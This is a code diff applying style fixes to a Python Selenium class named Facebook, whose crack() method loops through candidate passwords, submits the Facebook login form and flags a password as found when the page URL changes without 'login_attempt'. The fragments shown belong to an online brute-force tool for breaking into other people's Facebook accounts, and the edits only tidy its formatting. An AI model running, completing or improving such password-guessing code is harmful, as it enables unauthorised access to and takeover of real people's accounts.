@@ -1,5 +1,6 @@
 import time
 
+
 class Facebook:
 
     def __init__(self, browser):
@@ -18,15 +19,16 @@ class Facebook:
         email.send_keys(self.username)
         form = self.browser.driver.find_element_by_id('login_form')
         form.submit()
-        
+
         try:
-            name = self.browser.driver.find_element_by_xpath("//span[contains(text(), 'Log In as')]")
+            name = self.browser.driver.find_element_by_xpath(
+                "//span[contains(text(), 'Log In as')]")
             if name:
-                self.name = name.text.replace('Log In as ','')
+                self.name = name.text.replace('Log In as ', '')
                 return True
             else:
                 return False
-        except:
+        except BaseException:
             return False
 
     def crack(self):
@@ -46,7 +48,7 @@ class Facebook:
             form.submit()
 
             url = self.browser.driver.current_url
-            if (url != self.url) and (not 'login_attempt' in url):
+            if (url != self.url) and ('login_attempt' not in url):
                 found = password
                 break
             time.sleep(self.delay)
